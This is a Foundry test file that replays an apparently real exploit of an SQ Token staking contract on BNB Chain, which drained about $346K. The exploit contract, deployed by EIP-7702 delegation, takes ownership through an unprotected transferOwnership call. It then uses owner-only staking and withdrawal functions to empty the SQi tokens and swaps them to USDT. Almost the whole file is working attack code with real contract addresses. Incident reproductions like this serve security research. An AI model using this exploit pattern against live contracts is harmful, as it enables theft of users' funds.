// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : ~$346.1K
// Attacker : https://bscscan.com/address/0xE746c9043Aa0106853c5e4380A9A307Fe385378e
// Attack Contract : https://bscscan.com/address/0x0ECADd99B6A2f5b18a9e05c29074471A5970dd0D
// Vulnerable Contract : https://bscscan.com/address/0x404404A845FFF0201f3a4D419B4839fC419c99F7
// Attack Tx : https://bscscan.com/tx/0x1bae633eda9b3d98999ea116bc403712eaa07093ec32bd6d559085cc4607f5b8
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x404404A845FFF0201f3a4D419B4839fC419c99F7#code
//
// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/Defi_Nerd_sec/status/2054425936746148148

contract SQTokenStakingTest is Test {
    bytes32 internal constant TX_HASH = 0x1bae633eda9b3d98999ea116bc403712eaa07093ec32bd6d559085cc4607f5b8;
    address internal constant ATTACKER = 0xE746c9043Aa0106853c5e4380A9A307Fe385378e;
    address internal constant EXPLOIT_IMPLEMENTATION = 0x0ECADd99B6A2f5b18a9e05c29074471A5970dd0D;
    ISQTokenStaking internal constant STAKING = ISQTokenStaking(0x404404A845FFF0201f3a4D419B4839fC419c99F7);
    IERC20 internal constant SQI = IERC20(0xC7D2FAb3E1f81f3c8FB1669a2f9dff647eaEA3E9);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeV2Router internal constant PANCAKE_ROUTER = IPancakeV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", TX_HASH);
        vm.etch(EXPLOIT_IMPLEMENTATION, address(new SQTokenStakingExploit()).code);
        vm.label(ATTACKER, "Attacker");
        vm.label(EXPLOIT_IMPLEMENTATION, "EIP-7702 Exploit Implementation");
        vm.label(address(STAKING), "SQ Token Staking");
        vm.label(address(SQI), "SQi");
        vm.label(address(USDT), "USDT");
        vm.label(address(PANCAKE_ROUTER), "Pancake V2 Router");
    }

    function testExploit() public {
        uint256 beforeUsdt = USDT.balanceOf(ATTACKER);

        vm.setNonce(ATTACKER, 7);
        vm.attachDelegation(
            VmSafe.SignedDelegation({
                v: 1,
                r: 0x4914ffc82849065530e73907a8a64a10db847e8f939e22a84500326a4cec11f2,
                s: 0x412037db5dcb2c0bcac631442936105e04f355d1ab5293ea7581e898bdbad72c,
                nonce: 7,
                implementation: EXPLOIT_IMPLEMENTATION
            })
        );
        vm.prank(ATTACKER, ATTACKER);
        SQTokenStakingExploit(ATTACKER).attack();

        uint256 usdtProfit = USDT.balanceOf(ATTACKER) - beforeUsdt;
        assertEq(usdtProfit, 346_137_034_345_014_454_603_094);

        console.log("Stolen USDT", usdtProfit);
    }
}

contract SQTokenStakingExploit {
    address internal constant REFERRAL = 0x36E11a943ce5227CD31BB5F9eFe03d3De30c1a6B;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    ISQTokenStaking internal constant STAKING = ISQTokenStaking(0x404404A845FFF0201f3a4D419B4839fC419c99F7);
    IERC20 internal constant SQI = IERC20(0xC7D2FAb3E1f81f3c8FB1669a2f9dff647eaEA3E9);
    IPancakeV2Router internal constant PANCAKE_ROUTER = IPancakeV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function attack() external {
        address attacker = address(this);

        STAKING.transferOwnership(attacker);
        require(SQI.approve(address(PANCAKE_ROUTER), type(uint256).max), "SQi approve failed");
        STAKING.bind(REFERRAL);

        uint256[] memory stakeDays = new uint256[](1);
        stakeDays[0] = 0;
        STAKING.setUintArray(1, stakeDays);

        STAKING.stakeOwner(attacker, 90_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 90_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 70_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 55_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 42_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 14_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 9_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 7_500 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 4_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 3_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 2_000 ether, 1_760_134_760);
        STAKING.stakeOwner(attacker, 100 ether, 1_760_134_760);

        STAKING.unstake(1);
        STAKING.unstake(2);
        STAKING.unstake(3);
        STAKING.unstake(4);
        STAKING.unstake(5);
        STAKING.unstake(6);
        STAKING.unstake(7);
        STAKING.unstake(8);
        STAKING.unstake(9);
        STAKING.unstake(10);

        uint256 sqiInStaking = SQI.balanceOf(address(STAKING));
        STAKING.withdrawalTokens(address(SQI), attacker, sqiInStaking);

        address[] memory path = new address[](2);
        path[0] = address(SQI);
        path[1] = USDT;
        PANCAKE_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SQI.balanceOf(attacker), 0, path, attacker, block.timestamp + 300
        );
    }
}

interface ISQTokenStaking {
    function transferOwnership(address newOwner) external;
    function bind(address referral) external;
    function setUintArray(uint8 valueType, uint256[] calldata values) external;
    function stakeOwner(address user, uint160 amount, uint40 stakeTime) external;
    function unstake(uint256 index) external returns (uint256);
    function withdrawalTokens(address token, address recipient, uint256 amount) external;
}

interface IPancakeV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
